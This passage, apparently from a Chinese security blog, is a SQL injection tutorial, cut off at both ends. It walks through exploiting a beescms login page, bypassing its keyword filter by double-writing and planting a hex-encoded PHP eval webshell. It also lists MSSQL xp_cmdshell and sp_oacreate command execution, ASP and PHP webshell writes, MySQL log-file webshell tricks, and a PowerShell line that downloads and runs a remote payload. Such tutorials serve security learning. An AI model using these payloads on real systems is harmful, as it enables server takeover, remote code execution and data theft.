randstr(length):<br>str_list = [random.choice(string.ascii_letters) for i in range(length)]<br>random_str = ‘’.join(str_list)<br>return random_str<br>def main():<br>data={}<br>for i in range(num_min,num_max):<br>data[randstr(random.randint(varname_min,varname_max))]=randstr(random.randint(data_min,data_max))<br>print(‘&amp;’+parse.urlencode(data)+’&amp;’)<br>main()</p>\n<h3 id=\"SQL注入实战渗透测试\"><a href=\"#SQL注入实战渗透测试\" class=\"headerlink\" title=\"SQL注入实战渗透测试\"></a>SQL注入实战渗透测试</h3><p>1、首先打开指定站点，这里是以beescms搭建的网站<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317033373-8f7c7d9b-b60a-451a-b28d-ba425f92f9b4.png#align=left&display=inline&height=129&margin=%5Bobject%2Object%5D&name=image.png&originHeight=258&originWidth=554&size=81788&status=done&style=none&width=277\" alt=\"image.png\"> <br>2、通过御剑扫描发现了后台路径/admin/login.php<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317036903-c1a03aaf-c415-48e7-a1c9-6b124a0aa140.png#align=left&display=inline&height=146&margin=%5Bobject%2Object%5D&name=image.png&originHeight=291&originWidth=554&size=59025&status=done&style=none&width=277\" alt=\"image.png\"><br>3、访问后台<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317042060-67c5cd02-56e2-44e5-a90f-05749886fcdc.png#align=left&display=inline&height=142&margin=%5Bobject%2Object%5D&name=image.png&originHeight=283&originWidth=554&size=60786&status=done&style=none&width=277\" alt=\"image.png\"><br>4、抓包并发送到重放数据包模块进行测试<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317045189-57e2568e-0bce-4732-a132-41fb7f0f1967.png#align=left&display=inline&height=118&margin=%5Bobject%2Object%5D&name=image.png&originHeight=237&originWidth=554&size=59839&status=done&style=none&width=277\" alt=\"image.png\"><br>5、在账号处加一个单引号测试，发现页面报错了，这里说明存在SQL注入<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317049040-76788297-cf7a-498a-bf05-a94be7c5846d.png#align=left&display=inline&height=92&margin=%5Bobject%2Object%5D&name=image.png&originHeight=184&originWidth=554&size=53711&status=done&style=none&width=277\" alt=\"image.png\"><br>6、打开源码，找到该登录处，发现对于post传参的user进行了函数fl_value和fl_html处理。处理之后后面就放到check_login函数执行了。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317053351-e7c46278-96ce-446c-9113-49f608e9462e.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&name=image.png&originHeight=288&originWidth=554&size=64458&status=done&style=none&width=277\" alt=\"image.png\"><br>7、定位fl_value函数，发现对于SQL注入进行了处理，将敏感字符过滤为空。<br>过滤的敏感字符有：select | insert | update | and | in | on | left | joins | delete | %| = | / * | * | ../ | ./ | union | from | where | group | into | load_file | outfile<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317057459-1b75bd6c-f68f-471d-803f-4606333306ff.png#align=left&display=inline&height=43&margin=%5Bobject%2Object%5D&name=image.png&originHeight=85&originWidth=554&size=19441&status=done&style=none&width=277\" alt=\"image.png\"><br>8、很明显这里防SQL注入进行的不是很到位，只进行了一次替换为空，那么就可以通过双写关键字进行绕过。定位第二个处理函数fl_html，发现这里是进行了html实体化处理，是防止xss的，htmlspecialchars函数默认情况下只对双引号进行编码，对我们使用单引号进行SQL注入没有影响。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317060800-0510c154-b4ff-4202-9b12-37db39d11e93.png#align=left&display=inline&height=29&margin=%5Bobject%2Object%5D&name=image.png&originHeight=58&originWidth=366&size=11625&status=done&style=none&width=183\" alt=\"image.png\"><br>9、跟进check_login函数，发现将传入的数据直接放到了SQL查询语句进行查询。那么此处通过双写即可绕过进行注入了。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317065197-0ab9f91c-73e7-4991-b518-2a049007d84d.png#align=left&display=inline&height=58&margin=%5Bobject%2Object%5D&name=image.png&originHeight=115&originWidth=554&size=27857&status=done&style=none&width=277\" alt=\"image.png\"><br>10、回到网站，通过order by 判断出当前数据库字段数为5<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317068401-fc66cb55-5dfb-41f7-9f55-726dab9ffd30.png#align=left&display=inline&height=101&margin=%5Bobject%2Object%5D&name=image.png&originHeight=201&originWidth=554&size=50976&status=done&style=none&width=277\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317071848-afb83dbf-a19a-40fb-9c66-af5cabf23c07.png#align=left&display=inline&height=80&margin=%5Bobject%2Object%5D&name=image.png&originHeight=160&originWidth=554&size=45734&status=done&style=none&width=277\" alt=\"image.png\"><br>11、经测试，联合查询终于成功了。绕过方法：<br>un union ion -&gt; union<br>seselectlect -&gt; select<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317076201-0c74fd9e-0530-4941-8e19-68fffcaade81.png#align=left&display=inline&height=111&margin=%5Bobject%2Object%5D&name=image.png&originHeight=221&originWidth=554&size=51714&status=done&style=none&width=277\" alt=\"image.png\"><br>12、这里很明显不能显错注入，尝试使用报错注入获取数据也失败，没有将报错的数据输出出来。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317082978-87ccd5f5-eed6-42b8-bd8c-d313b5d51ff3.png#align=left&display=inline&height=117&margin=%5Bobject%2Object%5D&name=image.png&originHeight=234&originWidth=554&size=62436&status=done&style=none&width=277\" alt=\"image.png\"><br>13、尝试使用sql注入写入webshell，发现页面报错了，通过报错信息可以看到是写入的一句话木马里面带有特殊字符影响了文件的写入。对于敏感字符的绕过方法：<br>in into  -&gt; into<br>ououtfiletfile -&gt; outfile<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317086950-f53a248a-e529-424b-8033-3d275770dfae.png#align=left&display=inline&height=116&margin=%5Bobject%2Object%5D&name=image.png&originHeight=232&originWidth=554&size=65986&status=done&style=none&width=277\" alt=\"image.png\"><br>14、因为符号进行了影响，所以通过16进制来写入webshell，将一句话木马转换为16进制。因为需要数据库识别出这个是16进制的数据，所以要在最前面加上0x。得到16进制的一句话木马：<br>0x3c3f70687020406576616c28245f524551554553545b315d293b3f3e<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317091049-51499331-b0a7-4eb4-9941-6a45055e0e2d.png#align=left&display=inline&height=152&margin=%5Bobject%2Object%5D&name=image.png&originHeight=304&originWidth=554&size=19492&status=done&style=none&width=277\" alt=\"image.png\"><br>15、替换16进制的一句话木马到burp数据包中放包，成功执行了代码，页面返回正常。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317094983-f7fb5184-1a94-4cf1-8295-4c3423910346.png#align=left&display=inline&height=124&margin=%5Bobject%2Object%5D&name=image.png&originHeight=247&originWidth=554&size=62722&status=done&style=none&width=277\" alt=\"image.png\"><br>16、查看服务器文件，成功有了一个8.php文件，内容为一句话木马。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317099323-d646af4a-b862-405d-823c-b2975028e63e.png#align=left&display=inline&height=127&margin=%5Bobject%2Object%5D&name=image.png&originHeight=254&originWidth=554&size=56751&status=done&style=none&width=277\" alt=\"image.png\"><br>17、通过菜刀工具，连接一句话木马，获取网站webshell。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317103226-679c62de-5503-4996-9ea4-acbbad2e0683.png#align=left&display=inline&height=119&margin=%5Bobject%2Object%5D&name=image.png&originHeight=238&originWidth=554&size=18591&status=done&style=none&width=277\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317106445-a24046e6-17ce-443d-b37b-63bd3fc90125.png#align=left&display=inline&height=137&margin=%5Bobject%2Object%5D&name=image.png&originHeight=274&originWidth=554&size=41660&status=done&style=none&width=277\" alt=\"image.png\"><br>18、进行执行系统命令操作。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317113216-93f538c1-d58a-4bac-b262-a15d676aa57a.png#align=left&display=inline&height=137&margin=%5Bobject%2Object%5D&name=image.png&originHeight=273&originWidth=554&size=27211&status=done&style=none&width=277\" alt=\"image.png\"></p>\n<h2 id=\"其他类型的SQL注入\"><a href=\"#其他类型的SQL注入\" class=\"headerlink\" title=\"其他类型的SQL注入\"></a>其他类型的SQL注入</h2><h3 id=\"1、搜索框注入\"><a href=\"#1、搜索框注入\" class=\"headerlink\" title=\"1、搜索框注入\"></a>1、搜索框注入</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=<span class=\"number\">1</span><span class=\"string\">&#x27; and &#x27;</span><span class=\"number\">1</span>%<span class=\"string\">&#x27;=&#x27;</span><span class=\"number\">1</span>\t\t<span class=\"comment\">//返回正确的搜索结果</span></span><br><span class=\"line\">?id=<span class=\"number\">1</span><span class=\"string\">&#x27; and &#x27;</span><span class=\"number\">1</span>%<span class=\"string\">&#x27;=&#x27;</span><span class=\"number\">2</span>\t\t<span class=\"comment\">//没有返回结果</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"2、header头部注入\"><a href=\"#2、header头部注入\" class=\"headerlink\" title=\"2、header头部注入\"></a>2、header头部注入</h3><p>Client-IP<br>User-Agent<br>X-Forwarded-For</p>\n<h2 id=\"SQL注入利用\"><a href=\"#SQL注入利用\" class=\"headerlink\" title=\"SQL注入利用\"></a>SQL注入利用</h2><h3 id=\"1、MSSQL\"><a href=\"#1、MSSQL\" class=\"headerlink\" title=\"1、MSSQL\"></a>1、MSSQL</h3><h4 id=\"0x01-–os-shell\"><a href=\"#0x01-–os-shell\" class=\"headerlink\" title=\"0x01 –os-shell\"></a>0x01 –os-shell</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> /r C: %i in (*<span class=\"number\">020</span>.jpg*) <span class=\"keyword\">do</span> @<span class=\"keyword\">echo</span> %i <span class=\"comment\">//寻找020.jpg，获取所在目录</span></span><br><span class=\"line\"></span><br><span class=\"line\">dir c:\\phpstudy\\WWW\\image\t\t\t\t\t\t\t\t<span class=\"comment\">//列出某目录下文件</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> ^&lt;%@ Page Language=<span class=\"string\">&quot;Jscript&quot;</span>%^&gt;^&lt;%<span class=\"keyword\">eval</span>(Request.Item[<span class=\"string\">&quot;1&quot;</span>],<span class=\"string\">&quot;unsafe&quot;</span>);%^&gt; &gt; c:\\phpstudy\\WWW\\image\\shell.asp</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x02-命令执行\"><a href=\"#0x02-命令执行\" class=\"headerlink\" title=\"0x02 命令执行\"></a>0x02 命令执行</h4><p>1、xp_cmdshell</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#开启xp_cmdshell</span></span><br><span class=\"line\">?id=<span class=\"number\">1</span>;<span class=\"keyword\">use</span> <span class=\"title\">master</span>;exec sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>,<span class=\"number\">1</span>;reconfigure;exec sp_configure <span class=\"string\">&#x27;xp_cmdshell&#x27;</span>,<span class=\"number\">1</span>;reconfigure;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#执行</span></span><br><span class=\"line\">?id=<span class=\"number\">1</span>;<span class=\"keyword\">use</span> <span class=\"title\">master</span>;exec master..xp_cmdshell <span class=\"string\">&quot;whoami&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#恢复被删除的xp_cmdshell(提示xplog79.dll找不到则自己上传)</span></span><br><span class=\"line\">exec sp_addextendedproc xp_cmdshell ,@dllname=<span class=\"string\">&quot;D:\\\\xplog79.dll&quot;</span></span><br></pre></td></tr></table></figure>\n<p>2、sp_oacreate</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#xp_cmdshell删除后可以使用sp_oacreate</span><br><span class=\"line\">#开启sp_oacreate</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>,<span class=\"number\">1</span>;</span><br><span class=\"line\">reconfigure <span class=\"keyword\">with</span> override;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;Ole Automation Procedures&#x27;</span>,<span class=\"number\">1</span>;</span><br><span class=\"line\">reconfigure <span class=\"keyword\">with</span> override;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>,<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">#执行[此方法无回显]</span><br><span class=\"line\"><span class=\"keyword\">declare</span> <span class=\"variable\">@shell</span> <span class=\"type\">int</span> <span class=\"keyword\">exec</span> sp_oacreate <span class=\"string\">&#x27;wscript.shell&#x27;</span>,<span class=\"variable\">@shell</span> output <span class=\"keyword\">exec</span> sp_oamethod <span class=\"variable\">@shell</span>,<span class=\"string\">&#x27;run&#x27;</span>,<span class=\"keyword\">null</span>,<span class=\"string\">&#x27;c:\\windows\\system32\\cmd.exe /c whoami &gt;d:\\\\temp\\\\1.txt&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>3、通过沙盒执行命令<br>4、注册表<br>5、通过Agent Job执行命令</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#执行cs powershell命令</span><br><span class=\"line\">USE msdb; <span class=\"keyword\">EXEC</span> dbo.sp_add_job <span class=\"variable\">@job</span>_name <span class=\"operator\">=</span> N<span class=\"string\">&#x27;test_powershell_job1&#x27;</span> ; <span class=\"keyword\">EXEC</span> sp_add_jobstep <span class=\"variable\">@job</span>_name <span class=\"operator\">=</span> N<span class=\"string\">&#x27;test_powershell_job1&#x27;</span>, <span class=\"variable\">@step</span>_name <span class=\"operator\">=</span> N<span class=\"string\">&#x27;test_powershell_name1&#x27;</span>, <span class=\"variable\">@subsystem</span> <span class=\"operator\">=</span> N<span class=\"string\">&#x27;PowerShell&#x27;</span>, <span class=\"variable\">@command</span> <span class=\"operator\">=</span> N<span class=\"string\">&#x27;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;&#x27;http://192.168.214.129:80/a&#x27;&#x27;))&quot;&#x27;</span>, <span class=\"variable\">@retry</span>_attempts <span class=\"operator\">=</span> <span class=\"number\">1</span>, <span class=\"variable\">@retry</span>_interval <span class=\"operator\">=</span> <span class=\"number\">5</span> ;<span class=\"keyword\">EXEC</span> dbo.sp_add_jobserver <span class=\"variable\">@job</span>_name <span class=\"operator\">=</span> N<span class=\"string\">&#x27;test_powershell_job1&#x27;</span>; <span class=\"keyword\">EXEC</span> dbo.sp_start_job N<span class=\"string\">&#x27;test_powershell_job1&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x03-文件操作\"><a href=\"#0x03-文件操作\" class=\"headerlink\" title=\"0x03 文件操作\"></a>0x03 文件操作</h4><p>1、判断文件是否存在</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#返回<span class=\"number\">0</span>表示不存在，返回<span class=\"number\">1</span>表示存在</span><br><span class=\"line\"><span class=\"keyword\">exec</span> xp_fileexist &quot;c:\\\\users\\\\public\\\\test.txt&quot;</span><br></pre></td></tr></table></figure>\n<p>2、列目录</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#第一个参数表示要查看的文件夹，第二个参数表示递归层数，第三个参数表示展示的内容包括文件。</span><br><span class=\"line\"><span class=\"keyword\">exec</span> xp_subdirs &quot;C:\\Users\\Administrator\\&quot;,<span class=\"number\">2</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>3、写文件</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#开启Web Assistant Procedures</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;Web Assistant Procedures&#x27;</span>,<span class=\"number\">1</span>;RECONFIGURE;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_makewebtask <span class=\"string\">&#x27;c:\\www\\testwr.asp&#x27;</span>,<span class=\"string\">&#x27;select&#x27;&#x27;&lt;%execute(request(&#x27;</span>ss<span class=\"string\">&#x27;))%&gt;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>4、创建目录</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> xp_create_subdir <span class=\"string\">&#x27;D:\\test&#x27;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"0x04-信息获取\"><a href=\"#0x04-信息获取\" class=\"headerlink\" title=\"0x04 信息获取\"></a>0x04 信息获取</h4><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> xp_getnetname\t\t\t<span class=\"operator\">/</span><span class=\"operator\">/</span>计算机名</span><br><span class=\"line\"><span class=\"keyword\">exec</span> xp_msver\t\t\t\t\t\t<span class=\"operator\">/</span><span class=\"operator\">/</span>系统信息</span><br><span class=\"line\"><span class=\"keyword\">exec</span> xp_fixeddrives\t\t\t<span class=\"operator\">/</span><span class=\"operator\">/</span>驱动器信息</span><br><span class=\"line\"><span class=\"keyword\">select</span> default_domain() <span class=\"keyword\">as</span> mydomain;\t\t<span class=\"operator\">/</span><span class=\"operator\">/</span>获取域名</span><br></pre></td></tr></table></figure>\n<h3 id=\"2、MYSQL\"><a href=\"#2、MYSQL\" class=\"headerlink\" title=\"2、MYSQL\"></a>2、MYSQL</h3><p>在高版本的mysql中，一般默认配置了–secure_file_priv为null限制了文件写入，这种情况就需要通过general_log_file/show_query_log_file来尝试写文件。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#general_log_file</span><br><span class=\"line\"><span class=\"keyword\">set</span> <span class=\"keyword\">global</span> general_log<span class=\"operator\">=</span><span class=\"string\">&#x27;on&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">set</span> <span class=\"keyword\">global</span> general_log_file<span class=\"operator\">=</span><span class=\"string\">&#x27;D:/phpStudy/WWW/1.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"string\">&#x27;&lt;?php assert($_POST[1]);?&gt;&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">set</span> <span class=\"keyword\">global</span> general_log<span class=\"operator\">=</span><span class=\"string\">&#x27;off&#x27;</span>; <span class=\"operator\">/</span><span class=\"operator\">/</span>切记关闭</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#show_query_log_file</span><br><span class=\"line\"><span class=\"keyword\">set</span> <span class=\"keyword\">global</span> show_query_log<span class=\"operator\">=</span><span class=\"string\">&#x27;on&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">set</span> <span class=\"keyword\">global</span> show_query_log_file<span class=\"operator\">=</span><span class=\"string\">&#x27;D:\\\\phpStudy\\\\WWW\\\\1.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">select</span> sleep(<span class=\"number\">15</span>),<span class=\"string\">&#x27;&lt;?php assert($_POST[1]);?&gt;&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">set</span> <span class=\"keyword\">global</span> show_query_log<span class=\"operator\">=</span><span class=\"string\">&#x27;off&#x27;</span>; <span class=\"operator\">/</span><span class=\"operator\">/</span>切记关闭</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h2 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h2><h3 id=\"概念：\"><a href=\"#概念：\" class=\"headerlink\" title=\"概念：\"></a>概念：</h3><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。<br>在owasp top 10常年霸占榜首漏洞的位置，可以当之无愧称它为漏洞之王。SQL注入是一个通过拼接sql查询语句获取数据库里面的数据的漏洞。常见的漏洞点为url中带有的id传参，如<a href=\"http://www.xxx.com/i.php?id=13\">http://www.xxx.com/i.php?id=13</a>。<br>此处的13会通过php传参传到数据库进行查询，一般的查询语句为:select * from news where id=’13’。攻击者往往通过在id=13后面加入单引号闭合前面的查询内容后面加上union联合查询其他内容来获取数据。</p>\n<h3 id=\"SQL注入的条件\"><a href=\"#SQL注入的条件\" class=\"headerlink\" title=\"SQL注入的条件\"></a>SQL注入的条件</h3><p>1、用户可以控制输入的数据，可以控制传参的内容。<br>2、用户传参的内容被拼接到了代码去执行。</p>\n<h3 id=\"判断是否存在SQL注入的具体流程\"><a href=\"#判断是否存在SQL注入的具体流程\" class=\"headerlink\" title=\"判断是否存在SQL注入的具体流程:\"></a>判断是否存在SQL注入的具体流程:</h3><p>1、首先获取url：<a href=\"http://www.xxx.com/i.php?id=1\">http://www.xxx.com/i.php?id=1</a><br>2、很明显这里的13是通过get传参被放到数据库查询语句中的我们可以控制的参数。一般的查询语句为select * from test where id=’1’<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316298798-8ccfa038-d152-4f35-8958-c49444bff928.png#align=left&display=inline&height=150&margin=%5Bobject%2Object%5D&name=image.png&originHeight=150&originWidth=554&size=21745&status=done&style=none&width=554\" alt=\"image.png\"><br>3、接下来在1后面加个单引号，可以看到页面报错了，因为我们的1’被当成代码执行了，当前查询语句为：Select<em>from test where id =’1’’，比正常的多了一个单引号，所以导致页面报错了。因为我的输入的东西导致了页面发生了变化，特别是这种报错了，很明显存在SQL注入漏洞。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316314777-a894da71-648e-48ed-98ef-ef2920228efe.png#align=left&display=inline&height=134&margin=%5Bobject%2Object%5D&name=image.png&originHeight=134&originWidth=554&size=30262&status=done&style=none&width=554\" alt=\"image.png\"><br>4、接下来传参为1’ and 1=1 %23，页面返回正常，与id=1的页面相同。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316319310-1a11b5b5-ce77-435e-9c0a-d6a567c92a91.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&name=image.png&originHeight=144&originWidth=554&size=25407&status=done&style=none&width=554\" alt=\"image.png\"><br>5、更换传参为1‘ and 1=2 %23，页面不一样了，查询不了数据库内的数据，当前查询语句为：Select</em>from test where id =’1’ and 1=2 #’<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316325147-77f76770-d9d7-4e52-b710-48d496b98797.png#align=left&display=inline&height=118&margin=%5Bobject%2Object%5D&name=image.png&originHeight=118&originWidth=554&size=21180&status=done&style=none&width=554\" alt=\"image.png\"><br>这里先解释一下%23，众所周知的在mysql数据库中，#是注释符，能够注释掉后面的内容，但是在url栏中，#有锚点的作用，所以说我们如果需要注释后面的单引号，需要使用url编码后的#，也就是%23。<br>在这里看到and 1=1页面返回正常，and 1=2 页面返回不正常。从渗透测试的角度判断就是代码被执行了，我们通过输出的查询语句也看到了1=1和1=2被放到查询语句查询了，因为中间的连接符是and，在1=2的时候恒为假，所以查询不出内容。两者不同，也就判断出当前存在SQL注入漏洞。</p>\n<h3 id=\"SQL注入分类\"><a href=\"#SQL注入分类\" class=\"headerlink\" title=\"SQL注入分类\"></a>SQL注入分类</h3><h4 id=\"显错注入\"><a href=\"#显错注入\" class=\"headerlink\" title=\"显错注入\"></a>显错注入</h4><p>有回显数据的注入，可以通过union select联合查询将想要的数据返回到页面上的一种注入。在对于SQL注入的渗透测试过程中，我们的传参返回的内容可以在页面上输出，这种时候就可以用显错注入。接下来将详细介绍如何进行显错注入。<br>1、首先可以看到，传参id=1会输出两个数据：login name和password。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316363011-cb8e279e-0790-4dc7-8026-1d7ba13c7503.png#align=left&display=inline&height=125&margin=%5Bobject%2Object%5D&name=image.png&originHeight=250&originWidth=554&size=55928&status=done&style=none&width=277\" alt=\"image.png\"><br>2、加个单引号，页面报错了<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316370623-fb91b6e8-b745-4a07-8f13-3cf7c72bf2b7.png#align=left&display=inline&height=112&margin=%5Bobject%2Object%5D&name=image.png&originHeight=224&originWidth=554&size=59302&status=done&style=none&width=277\" alt=\"image.png\"><br>3、通过后面拼接and 1=1 %23来查看代码是否成功执行，可以看到页面返回正常了，闭合成功。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316375217-57e81aec-a8a6-4bf8-b5c3-0d78bf2864eb.png#align=left&display=inline&height=104&margin=%5Bobject%2Object%5D&name=image.png&originHeight=207&originWidth=554&size=27510&status=done&style=none&width=277\" alt=\"image.png\"><br>4、通过order by判断当前数据表中的字段数。通过order by 3的时候页面正常，order by 4的时候页面错误可以判断出当前字段数为3。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316379696-6ec0c84e-8418-4e32-9494-2aa3dfbfbb4a.png#align=left&display=inline&height=123&margin=%5Bobject%2Object%5D&name=image.png&originHeight=246&originWidth=551&size=29486&status=done&style=none&width=275.5\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316386641-3ec52df4-6f87-4a73-b058-4de7e7d52bd2.png#align=left&display=inline&height=85&margin=%5Bobject%2Object%5D&name=image.png&originHeight=169&originWidth=556&size=20870&status=done&style=none&width=278\" alt=\"image.png\"><br>5、联合查询获取数据。首先将前面的1改为-1，因为在数据库查询语句中默认会输出前面查询的东西的，将1改为-1会使前面查询不到内容，那么就会输出后面union select联合查询的数据。可以看到将2和3输出出来了，这里就是我们需要的显错注入的显错点。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316391466-cb32eb81-d7d1-40c2-be47-2e100ec71492.png#align=left&display=inline&height=114&margin=%5Bobject%2Object%5D&name=image.png&originHeight=227&originWidth=554&size=25091&status=done&style=none&width=277\" alt=\"image.png\"><br>6、有了显错点，接下来只需要将要查询的代码替换2和3即可获取想要的数据下面查询flag表中的flag数据。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">-1</span><span class=\"string\">&#x27; union select 1,flag,3 from flag %23</span></span><br></pre></td></tr></table></figure>\n<p><img 